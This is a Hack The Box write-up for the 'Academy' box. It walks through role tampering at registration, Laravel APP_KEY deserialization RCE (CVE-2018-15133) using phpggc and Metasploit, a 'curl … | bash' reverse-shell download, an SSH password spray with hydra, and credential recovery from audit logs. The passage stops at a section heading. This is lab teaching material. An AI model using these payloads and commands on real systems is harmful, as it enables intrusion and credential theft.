---
layout: post
title: "Hack The Box - Academy Writeup"
author: Chr0x6eOs
date: "2021-02-27"
subject: "Academy Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Chr0x6eOs, Linux]
lang: "en"
image:
    path: assets/htb/Academy/logo.png
    width: 300
    height: 300
...

![Academy](/assets/htb/Academy/academy.png)

[Academy](https://www.hackthebox.eu/home/machines/profile/297) is an easy linux box by [egre55](https://www.hackthebox.eu/home/users/profile/1190) & [mrb3n](https://www.hackthebox.eu/home/users/profile/2984).

### Overview

The box starts with web-enumeration, where we register an administrative account, by changing our roleid. By accessing the admin page, we find a new VHost, which leaks Laravel APP_KEY. Using the key, we can get RCE on the machine. Enumerating the system, we eventually find a `.env` file, which contains credentials for user. Using the password, we can ssh as user and read user.txt.

Enumerating the system as user, we we can see that we are part of the adm group (which allows us to read /var/log). Reading through the logs, we are able to use `aureport` to see su and sudo commands. This gives us credentials for the user mrb3n. Logging in as mrb3n, we can use sudo to run composer. Checking out gtfobins, we can get a shell using composer and read root.txt.

## Information Gathering

### Nmap
We begin our enumeration with a nmap scan for open ports.

```bash
root@darkness:~# nmap -sC -sV 10.10.10.215
Nmap scan report for 10.10.10.215
Host is up (0.049s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

For good measure, let us also do a full port scan.

```bash
root@darkness:~# nmap -p- 10.10.10.215
Nmap scan report for 10.10.10.215
Host is up (0.050s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx
```

The full port scan reveals a third open port: 33060.

## Enumeration

The open ports shown are **22** (SSH), **80** (HTTP) and **33060** (mysqlx ?). SSH usually is not that interesting, so let’s begin with HTTP. Nmap also gives us an interesting hint for HTTP: `Did not follow redirect to http://academy.htb/`. Let us add `academy.htb` to our /etc/hosts file.

### HTTP - Port 80

Going to http://10.10.10.215, we get redirected to http://academy.htb/ and following webpage is shown:

![Index webpage](/assets/htb/Academy/web/index-webpage.png)

Let us register an account to further enumerate the webpage.

![Registering an account](/assets/htb/Academy/web/register-webpage.png)

After logging in we get redirected to http://academy.htb/home.php.

![Home webpage](/assets/htb/Academy/web/home-webpage.png)

The webpage seems to be very static, so let us continue with a gobuster. We start a authenticated gobuster (supply our PHPSESSID-cookie to gobuster using the `-c` flag).

```bash
root@darkness:~# gobuster dir -u http://academy.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -c 'PHPSESSID=qeqevq3tgte20gnbo9p38m3rnu'
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://academy.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Cookies:                 PHPSESSID=qeqevq3tgte20gnbo9p38m3rnu
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2020/11/08 12:56:58 Starting gobuster in directory enumeration mode
===============================================================
/images (Status: 301)
/index.php (Status: 200)
/home.php (Status: 200)
/login.php (Status: 200)
/register.php (Status: 200)
/admin.php (Status: 200)
/config.php (Status: 200)
```

We get two interesting files returned: `admin.php` and `config.php`.

![Admin login](/assets/htb/Academy/web/admin-login-webpage.png)

The admin-login looks identical to the normal login, however our created account does not work here.

### Registering an administrative account

Let got back to the registration and intercept the request to see if we can make ourselves admin.

![Register request](/assets/htb/Academy/web/register-burp.png)

The requests contains a `roleid` files which is set to zero by default. Let us change the id to 1 and see if we are able to login to the admin page.

![Login as admin](/assets/htb/Academy/web/admin-login.png)

We successfully login and get redirected to `admin-page.php`.

![Admin page](/assets/htb/Academy/web/admin-page-webpage.png)

The page gives us a possible VHost: `dev-staging-01.academy.htb`. Let us add this sub-domain to our `/etc/hosts` file:

```bash
root@darkness:~# cat /etc/hosts
[...]
10.10.10.215    academy.htb dev-staging-01.academy.htb
```

### VHost enumeration

Accessing http://dev-staging-01.academy.htb/ gives us following page.

![Dev stating page](/assets/htb/Academy/web/dev-index-webpage.png)

The VHost seems to be running on [Laravel](https://laravel.com/), which is a PHP framework. Reading through the error message, it seems like the application does not have access to it's logfile. While the error itself is not interesting for us, the Environment & details data seems to be quite valuable.

![Environment & details data](/assets/htb/Academy/web/dev-environment-data.png)

We have two sets of information leaked that should be kept secret:

- APP_KEY: `APP_KEY 	"base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="`
- Database-credentials: `DB_USERNAME 	"homestead"` & `DB_PASSWORD 	"secret"`

Remembering back to our nmap-scan, port 33060 running mysqlx is open. Let us try to authenticate to the port.

### Trying to connect to mysqlx (failed)

In order to connect to mysqlx, we can use [mysqlsh](https://dev.mysql.com/doc/mysql-shell/8.0/en/mysqlsh.html).

```bash
root@darkness:~# mysqlsh 
MySQL Shell 8.0.22

Copyright (c) 2016, 2020, Oracle and/or its affiliates.
Oracle is a registered trademark of Oracle Corporation and/or its affiliates.
Other names may be trademarks of their respective owners.

 MySQL  JS > \c --mx homestead:secret@10.10.10.215
Creating an X protocol session to 'homestead@10.10.10.215'
MySQL Error 1045: Access denied for user 'homestead'@'10.10.14.8' (using password: YES)
```

Seems like our credentials do not work for mysqlx. Let us focus on the APP_KEY then.

## Initial shell - Exploiting Laravel APP_KEY

After a bit of research, I found [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133) with a [PoC](https://github.com/kozmic/laravel-poc-CVE-2018-15133) and a [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/http/laravel_token_unserialize_exec.rb) available. The vulnerability exists because of an deserialization on the `X-XSRF-TOKEN`, which can be generated if the `APP_KEY` is known.

### Using the PoC

In order to exploit this vulnerability using the [PoC](https://github.com/kozmic/laravel-poc-CVE-2018-15133), we need to have [phpggc](https://github.com/ambionics/phpggc) on our machine. Then we simply generate a payload using one of the Laravel gadgets, download and execute the [exploit-code](https://github.com/kozmic/laravel-poc-CVE-2018-15133/blob/master/cve-2018-15133.php).

Let us start by generating a ping-payload to verify that we have code-execution.

```bash
root@darkness:~# phpggc Laravel/RCE1 system 'ping -c 4 10.10.14.8' -b
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjIwOiJwaW5nIC1jIDQgMTAuMTAuMTQuOCI7fQ==
```

Now we can run the exploit, to see how it works:

```bash
root@darkness:~# php cve-2018-15133.php 
PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic

Usage: cve-2018-15133.php <base64encoded_APP_KEY> <base64encoded-payload>
```

We simply have to supply the APP_KEY and our payload.

```bash
root@darkness:~# php cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjIwOiJwaW5nIC1jIDQgMTAuMTAuMTQuOCI7fQ==
PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic

HTTP header for POST request: 
X-XSRF-TOKEN: eyJpdiI6Ijhzc0pxVXRXaXExanM4am5keitSbUE9PSIsInZhbHVlIjoiYlRqVGxDTmliS1wvOTlGSndnaEYrcWdXOFBXY05aeUowblBQNmRhd0UwcUpOXC9uSmNudnpvUitkTUQ0MTZGN1FkbnQ0RUZmNU1WV2c2YmE5RWY4bkFoWWVSS0VBXC9XMktQcXE4bVIrZGs4TVhyeGdXMmk4YjhybHIzKytsNnBSUGRiTzRiVGtwNGdLNDI5SnBabU40NDRHbStqc3gzWHdpNnJYa1YyR0VGWk1JcXczYW5EaE1ZNHJxTlZwaTBYQ1ROUXhrYWVKZk5IcFVibXl2WHdjejYwdldCZDNnNlVBNFg5ODhBUVlnMUNBTzhpdUFZeHpCeXl5SmRwQWtPR3U4MmlyQWxORVVJQU5ua2RNRFBSNGk2OWc9PSIsIm1hYyI6IjNkYzMxZTFmNGJmZTUwNGM5YzA5MzFmZDNmZDRlNGQyMjRmOGM0YzM3NjRjNTZmM2U3MGNjNWFkZDAxMzEwZDYifQ==
```

Now we have our X-XSRF-Token and can simply trigger the exploit by sending a POST-request via curl.

```bash
root@darkness:~# curl http://dev-staging-01.academy.htb -s -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Ijhzc0pxVXRXaXExanM4am5keitSbUE9PSIsInZhbHVlIjoiYlRqVGxDTmliS1wvOTlGSndnaEYrcWdXOFBXY05aeUowblBQNmRhd0UwcUpOXC9uSmNudnpvUitkTUQ0MTZGN1FkbnQ0RUZmNU1WV2c2YmE5RWY4bkFoWWVSS0VBXC9XMktQcXE4bVIrZGs4TVhyeGdXMmk4YjhybHIzKytsNnBSUGRiTzRiVGtwNGdLNDI5SnBabU40NDRHbStqc3gzWHdpNnJYa1YyR0VGWk1JcXczYW5EaE1ZNHJxTlZwaTBYQ1ROUXhrYWVKZk5IcFVibXl2WHdjejYwdldCZDNnNlVBNFg5ODhBUVlnMUNBTzhpdUFZeHpCeXl5SmRwQWtPR3U4MmlyQWxORVVJQU5ua2RNRFBSNGk2OWc9PSIsIm1hYyI6IjNkYzMxZTFmNGJmZTUwNGM5YzA5MzFmZDNmZDRlNGQyMjRmOGM0YzM3NjRjNTZmM2U3MGNjNWFkZDAxMzEwZDYifQ==' 1>/dev/null
```

Let us check, if we have received the pings, as expected:

```bash
root@darkness:~# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
17:01:31.784581 IP academy.htb > 10.10.14.8: ICMP echo request, id 6, seq 1, length 64
17:01:31.784638 IP 10.10.14.8 > academy.htb: ICMP echo reply, id 6, seq 1, length 64
17:01:32.776193 IP academy.htb > 10.10.14.8: ICMP echo request, id 6, seq 2, length 64
17:01:32.776227 IP 10.10.14.8 > academy.htb: ICMP echo reply, id 6, seq 2, length 64
17:01:33.776513 IP academy.htb > 10.10.14.8: ICMP echo request, id 6, seq 3, length 64
17:01:33.776572 IP 10.10.14.8 > academy.htb: ICMP echo reply, id 6, seq 3, length 64
17:01:34.777933 IP academy.htb > 10.10.14.8: ICMP echo request, id 6, seq 4, length 64
17:01:34.777993 IP 10.10.14.8 > academy.htb: ICMP echo reply, id 6, seq 4, length 64
```

We have successfully received all the pings and can now try to get a shell.

```bash
root@darkness:~# phpggc Laravel/RCE1 system 'curl 10.10.14.8/s.sh | bash' -b
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjI3OiJjdXJsIDEwLjEwLjE0Ljgvcy5zaCB8IGJhc2giO30=
```

I am using the payload `curl 10.10.14.8/s.sh | bash` , which downloads a reverse-shell from my web-server and executes it.

```bash
root@darkness:~# php cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjI3OiJjdXJsIDEwLjEwLjE0Ljgvcy5zaCB8IGJhc2giO30=
PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic

HTTP header for POST request: 
X-XSRF-TOKEN: eyJpdiI6IlNKOWlVSTFQejY4dXBBbHUzUTFta2c9PSIsInZhbHVlIjoicWlGQkg5VTZmV1psb1QwcWt3dHNcL1ZudTFHaTB0VldWMzdYK0FQQUtpemZOTmMzbk1jNXdlaGF6UDVya1VLMFFqbXJBQXk3S3BQSmdydVFhdnJcL2dSNGtGaUJXdVNLY3FJb1ZuQ1dKMjdPMHRmaFppanE2SlZ2dHZPVVpLaDhxMEdEQjJzR2llaVNIYTByZGJ3dStHTm1acE42TUlmaVh0WmRFUEtmVjUrdXc5bVlkYVFKNnpuenoxR3BpR3ZaaFZGeFBKUVJtc3BySHVHSW5paXRCd3VUNEx6bjRzNjZNV2l1amNWYW5BeXpPOFwvdVpieUpkMmR2dlNWUDh6bytLd3kwRVwvNmdYMHdqMlUzV1U1RGFRYkJBPT0iLCJtYWMiOiJkMDNlMjFjNWJiNmU0Nzg1OTY2MDZlNTA3MjQ3NjE1NWI5YzdjNTk3NzY4YzRmZWRlMjVlNzU5NzAwNWJjY2IzIn0=
```

We get our X-XSRF-Token back and can paste it into our curl-command.

```bash
root@darkness:~# curl http://dev-staging-01.academy.htb -s -X POST -H 'X-XSRF-TOKEN: eyJpdiI6IlNKOWlVSTFQejY4dXBBbHUzUTFta2c9PSIsInZhbHVlIjoicWlGQkg5VTZmV1psb1QwcWt3dHNcL1ZudTFHaTB0VldWMzdYK0FQQUtpemZOTmMzbk1jNXdlaGF6UDVya1VLMFFqbXJBQXk3S3BQSmdydVFhdnJcL2dSNGtGaUJXdVNLY3FJb1ZuQ1dKMjdPMHRmaFppanE2SlZ2dHZPVVpLaDhxMEdEQjJzR2llaVNIYTByZGJ3dStHTm1acE42TUlmaVh0WmRFUEtmVjUrdXc5bVlkYVFKNnpuenoxR3BpR3ZaaFZGeFBKUVJtc3BySHVHSW5paXRCd3VUNEx6bjRzNjZNV2l1amNWYW5BeXpPOFwvdVpieUpkMmR2dlNWUDh6bytLd3kwRVwvNmdYMHdqMlUzV1U1RGFRYkJBPT0iLCJtYWMiOiJkMDNlMjFjNWJiNmU0Nzg1OTY2MDZlNTA3MjQ3NjE1NWI5YzdjNTk3NzY4YzRmZWRlMjVlNzU5NzAwNWJjY2IzIn0=' 1>/dev/null
```

Let us check back to our nc-listener:

```bash
root@darkness:~# nc -lvnp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.215.
Ncat: Connection from 10.10.10.215:39138.
bash: cannot set terminal process group (901): Inappropriate ioctl for device
bash: no job control in this shell
www-data@academy:/var/www/html/htb-academy-dev-01/public$
```

We successfully get a shell and can now continue enumerating the system.

### Using the Metasploit module

Using Metasploit, we can simply search for `laravel` and get the exploit listed.

```ruby
msf6 > search laravel

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/unix/http/laravel_token_unserialize_exec  2018-08-07       excellent  Yes    PHP Laravel Framework token Unserialize Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/http/laravel_token_unserialize_exec

msf6 > use 0
[*] Using configured payload cmd/unix/reverse_perl
msf6 exploit(unix/http/laravel_token_unserialize_exec) >
```

We then simply have to set the following options:

```ruby
msf6 exploit(unix/http/laravel_token_unserialize_exec) > options

Module options (exploit/unix/http/laravel_token_unserialize_exec):

   Name       Current Setting                               Required  Description
   ----       ---------------                               --------  -----------
   APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file
   Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.215                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                                            yes       The target port (TCP)
   SSL        false                                         no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                                             yes       Path to target webapp
   VHOST      dev-staging-01.academy.htb                    no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.8       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

With all options set, we simply run the exploit and get a shell.

```ruby
msf6 exploit(unix/http/laravel_token_unserialize_exec) > run

[*] Started reverse TCP handler on 10.10.14.8:4444 
[*] Command shell session 1 opened (10.10.14.8:4444 -> 10.10.10.215:46670) at 2020-11-08 17:09:43 +0100

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We successfully get a shell and can now continue enumerating the system.

## Privesc - User

Now that we have a shell, let us enumerate the system to find a privesc-vector to user. 

### Enumeration as www-data

Let us try to read the config.php file, that we found earlier from our gobuster.

```bash
www-data@academy:/var/www/html/academy$ find . -type f -name config.php
./vendor/psy/psysh/.phan/config.php
./vendor/psy/psysh/test/fixtures/default/.config/psysh/config.php
./vendor/psy/psysh/test/fixtures/mixed/.psysh/config.php
./vendor/psy/psysh/test/fixtures/config.php
./public/config.php
www-data@academy:/var/www/html/academy$ cat ./public/config.php
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$link=mysqli_connect('localhost','root','GkEWXn4h34g8qx9fZ1','academy');
?>
```

Let us try these credentials with mysql.

```bash
www-data@academy:/var/www/html/academy$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 84
Server version: 8.0.22-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

We can successfully authenticate on mysql and can now enumerate the database.

```sql
mysql> use academy;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_academy |
+-------------------+
| users             |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----+----------+----------------------------------+--------+---------------------+
| id | username | password                         | roleid | created_at          |
+----+----------+----------------------------------+--------+---------------------+
|  5 | dev      | a317f096a83915a3946fae7b7f035246 |      0 | 2020-08-10 23:36:25 |
| 11 | test8    | 5e40d09fa0529781afd1254a42913847 |      0 | 2020-08-11 00:44:12 |
| 12 | test     | 098f6bcd4621d373cade4e832627b4f6 |      0 | 2020-08-12 21:30:20 |
| 13 | test2    | ad0234829205b9033196ba818f7a872b |      1 | 2020-08-12 21:47:20 |
| 14 | tester   | 098f6bcd4621d373cade4e832627b4f6 |      1 | 2020-08-13 11:51:19 |
| 15 | Chronos  | 161ebd7d45089b3446ee4e0d86dbcf92 |      0 | 2020-11-08 13:19:43 |
| 16 | Chronos_ | 161ebd7d45089b3446ee4e0d86dbcf92 |      1 | 2020-11-08 13:20:45 |
+----+----------+----------------------------------+--------+---------------------+
```

We get a list of hashes. The only interesting user is dev, however cracking his hash does not seem to work. Let us further look at the academy web-directory.

```bash
www-data@academy:/var/www/html/academy$ ls -alh
total 288K
drwxr-xr-x 12 www-data www-data 4.0K Nov  9 11:55 .
drwxr-xr-x  4 root     root     4.0K Aug 13 12:36 ..
drwxr-xr-x  6 www-data www-data 4.0K Feb  7  2018 app
-rwxr-xr-x  1 www-data www-data 1.7K Feb  7  2018 artisan
drwxr-xr-x  3 www-data www-data 4.0K Feb  7  2018 bootstrap
-rw-r--r--  1 www-data www-data 1.5K Feb  7  2018 composer.json
-rw-r--r--  1 www-data www-data 188K Aug  9 11:57 composer.lock
drwxr-xr-x  2 www-data www-data 4.0K Feb  7  2018 config
drwxr-xr-x  5 www-data www-data 4.0K Feb  7  2018 database
-rw-r--r--  1 www-data www-data  706 Aug 13 12:42 .env
-rw-r--r--  1 www-data www-data  651 Feb  7  2018 .env.example
-rw-r--r--  1 www-data www-data  111 Feb  7  2018 .gitattributes
-rw-r--r--  1 www-data www-data  155 Feb  7  2018 .gitignore
-rw-r--r--  1 www-data www-data 1.2K Feb  7  2018 package.json
-rw-r--r--  1 www-data www-data 1.1K Feb  7  2018 phpunit.xml
drwxr-xr-x  4 www-data www-data 4.0K Nov  9 11:58 public
-rw-r--r--  1 www-data www-data 3.6K Feb  7  2018 readme.md
drwxr-xr-x  5 www-data www-data 4.0K Feb  7  2018 resources
-rw-r--r--  1 www-data www-data 5.4K Nov  9 11:44 rev.php
drwxr-xr-x  2 www-data www-data 4.0K Feb  7  2018 routes
-rw-r--r--  1 www-data www-data  563 Feb  7  2018 server.php
drwxr-xr-x  5 www-data www-data 4.0K Feb  7  2018 storage
drwxr-xr-x  4 www-data www-data 4.0K Feb  7  2018 tests
drwxr-xr-x 38 www-data www-data 4.0K Aug  9 11:57 vendor
-rw-r--r--  1 www-data www-data  549 Feb  7  2018 webpack.mix.js
```

The `.env` file catches my eye immediately.

```bash
www-data@academy:/var/www/html/academy$ cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!

BROADCAST_DRIVER=log
CACHE_DRIVER=file
SESSION_DRIVER=file
SESSION_LIFETIME=120
QUEUE_DRIVER=sync

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_DRIVER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
```

We get credentials for the user `dev`:`mySup3rP4s5w0rd!!`. Let us try these creds for all users using SSH.

### Password spraying - SSH

```bash
root@darkness:~# cat users.txt
root
sshd
egre55
mrb3n
cry0l1t3
21y4d
ch4p
g0blin
root@darkness:~# hydra -L users.txt -p 'mySup3rP4s5w0rd!!' ssh://10.10.10.215
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:8/p:1), ~1 try per task
[DATA] attacking ssh://10.10.10.215:22/
[22][ssh] host: 10.10.10.215   login: cry0l1t3   password: mySup3rP4s5w0rd!!
1 of 1 target successfully completed, 1 valid password found
```

We get a success for the user `cry0l1t3`! Let us login as this user via ssh.

```bash
ssh cry0l1t3@10.10.10.215
cry0l1t3@10.10.10.215's password: mySup3rP4s5w0rd!!
$ 
```

We successfully get a shell as cry0l1t3 and can read user.txt.

```bash
$ cat user.txt
6cb61***************************
```

## Privesc - Root

Now that we have a shell as user, let us enumerate the system to find a privesc path to root.

### Enumeration as cry0l1t3

Let us start our enumeration by checking the groups of our user.

```bash
cry0l1t3@academy:~$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

Seems like we are in the `adm` group, which allows us to read logs in `/var/log/`. Let us see what we have there.

```bash
cry0l1t3@academy:/var/log$ ls -alh                                                                                     
total 6.7M                                                                                                             
drwxrwxr-x  12 root      syslog          4.0K Nov  9 00:00 .                  
drwxr-xr-x  14 root      root            4.0K Aug  7 14:30 ..                  
-rw-r--r--   1 root      root               0 Nov  6 09:52 alternatives.log    
-rw-r--r--   1 root      root            1.1K Nov  5 12:55 alternatives.log.1  
-rw-r--r--   1 root      root             366 Sep 14 20:58 alternatives.log.2.gz
-rw-r--r--   1 root      root            2.5K Aug  7 14:33 alternatives.log.3.gz
drwxr-x---   2 root      adm             4.0K Nov  9 00:00 apache2             
drwxr-xr-x   2 root      root            4.0K Nov  8 20:28 apt                 
drwxr-x---   2 root      adm             4.0K Nov  8 20:09 audit               
-rw-r-----   1 syslog    adm             150K Nov  9 12:57 auth.log            
-rw-r-----   1 syslog    adm              11K Nov  8 20:09 auth.log.1
[...]
```

The `audit` folder catches my eye. Let us see what is in there...

```bash
cry0l1t3@academy:/var/log/audit$ ls -alh
total 25M
drwxr-x---  2 root adm    4.0K Nov  8 20:09 .
drwxrwxr-x 12 root syslog 4.0K Nov  9 00:00 ..
-rw-r-----  1 root adm    692K Nov  9 12:57 audit.log
-r--r-----  1 root adm    8.1M Nov  8 20:09 audit.log.1
-r--r-----  1 root adm    8.1M Sep  4 03:45 audit.log.2
-r--r-----  1 root adm    8.1M Aug 23 21:45 audit.log.3
```

### Getting creds from /var/log/audit

After a quick google: `/var/log/audit get password` I came across [this article](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/), which shows that we should be able to see su and sudo commands when running `aureport --tty`.

```bash
cry0l1t3@academy:/var/log/audit$ aureport --tty

TTY Report
===============================================
# date time event auid term sess comm data
===============================================
Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
3. 08/12/2020 02:28:24 89 0 ? 1 sh "whoami",<nl>
4. 08/12/2020 02:28:28 90 0 ? 1 sh "exit",<nl>
5. 08/12/2020 02:28:37 93 0 ? 1 sh "/bin/bash -i",<nl>
6. 08/12/2020 02:30:43 94 0 ? 1 nano <delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
7. 08/12/2020 02:32:13 95 0 ? 1 nano <down>,<up>,<up>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<down>,<backspace>,<down>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<delete>,<^X>,"y",<ret>
8. 08/12/2020 02:32:55 96 0 ? 1 nano "6",<^X>,"y",<ret>
9. 08/12/2020 02:33:26 97 0 ? 1 bash "ca",<up>,<up>,<up>,<backspace>,<backspace>,"cat au",<tab>,"| grep data=",<ret>,"cat au",<tab>,"| cut -f11 -d\" \"",<ret>,<up>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<left>,<right>,<right>,"grep data= | ",<ret>,<up>," > /tmp/data.txt",<ret>,"id",<ret>,"cd /tmp",<ret>,"ls",<ret>,"nano d",<tab>,<ret>,"cat d",<tab>," | xx",<tab>,"-r -p",<ret>,"ma",<backspace>,<backspace>,<backspace>,"nano d",<tab>,<ret>,"cat dat",<tab>," | xxd -r p",<ret>,<up>,<left>,"-",<ret>,"cat /var/log/au",<tab>,"t",<tab>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,<backspace>,"d",<tab>,"aud",<tab>,"| grep data=",<ret>,<up>,<up>,<up>,<up>,<up>,<down>,<ret>,<up>,<up>,<up>,<ret>,<up>,<up>,<up>,<ret>,"exit",<backspace>,<backspace>,<backspace>,<backspace>,"history",<ret>,"exit",<ret>
10. 08/12/2020 02:33:26 98 0 ? 1 sh "exit",<nl>
11. 08/12/2020 02:33:30 107 0 ? 1 sh "/bin/bash -i",<nl>
12. 08/12/2020 02:33:36 108 0 ? 1 bash "istory",<ret>,"history",<ret>,"exit",<ret>
13. 08/12/2020 02:33:36 109 0 ? 1 sh "exit",<nl>
```

Running the command, we get the password for the user `mrb3n`:`mrb3n_Ac@d3my!`. 

### (Additional) Further digging into the audit-logs

